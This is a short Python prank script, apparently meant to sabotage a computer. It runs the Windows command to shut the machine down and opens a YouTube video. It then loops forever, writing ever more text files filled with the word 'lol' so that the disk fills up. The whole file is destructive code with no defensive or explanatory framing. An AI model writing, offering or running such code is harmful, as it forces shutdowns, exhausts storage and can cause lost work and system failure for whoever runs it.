import subprocess
import webbrowser

subprocess.call(["shutdown", "/s"])
webbrowser.open_new("https://www.youtube.com/watch?v=bEldY1UsjZQ")


a=0

while True:
    text_file=open("fullstorage"+str(a)+".txt", "w")
    for q in range(0,200000):
        text_file.write("lol")
    a+=1
